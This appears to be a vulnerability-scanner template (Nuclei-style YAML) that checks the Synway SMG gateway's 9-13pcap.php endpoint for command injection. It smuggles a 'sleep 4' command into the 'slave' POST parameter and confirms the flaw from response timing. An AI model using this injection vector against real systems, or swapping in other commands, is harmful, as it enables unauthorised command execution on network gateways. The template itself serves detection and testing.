@@ -1,0 +1,41 @@
+id: Synway-SMG-9-13pcap-rce
+
+info:
+  name: Synway SMG网关管理软件 9-13pcap.php 命令注入漏洞
+  author: Synway
+  severity: high
+  tags: Synway
+
+http:
+  - raw:
+      - |
+        POST /en/9-13pcap.php HTTP/1.1
+        Host: {{Hostname}}
+        User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:96.0) Gecko/20100101 Firefox/96.0
+        Content-Type: application/x-www-form-urlencoded
+
+        slave_download=1&slave=
+
+      - |
+        POST /en/9-13pcap.php HTTP/1.1
+        Host: {{Hostname}}
+        User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:96.0) Gecko/20100101 Firefox/96.0
+        Content-Type: application/x-www-form-urlencoded
+
+        slave_download=1&slave=+;sleep 4;+#+
+
+    matchers-condition: and
+    matchers:
+      - type: status
+        status:
+          - 200
+      - type: dsl
+        dsl:
+          - 'duration_2 >= 4'
+          - 'duration_1 < 2'
+          - 'duration_2 < 6'
+        condition: and
+      - type: word
+        part: body
+        words:
+          - "Signaling Packet"
